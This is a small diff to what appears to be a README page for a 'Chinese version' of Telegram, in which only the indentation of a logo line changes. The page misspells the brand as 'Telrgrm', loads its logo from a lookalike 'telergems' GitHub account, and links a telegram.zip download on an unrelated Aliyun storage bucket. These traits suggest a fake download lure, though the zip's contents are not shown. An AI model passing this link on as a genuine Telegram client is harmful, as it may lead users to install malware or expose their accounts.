@@ -1,5 +1,5 @@
 ###                                                                       Telegrm中文版
-                                                ![image](https://github.com/telergems/telergems/blob/main/t_logo.png)
+![image](https://github.com/telergems/telergems/blob/main/t_logo.png)
                                                 [点击下载](https://downlzhifeijii.oss-cn-hongkong.aliyuncs.com/telegram.zip)
 
 
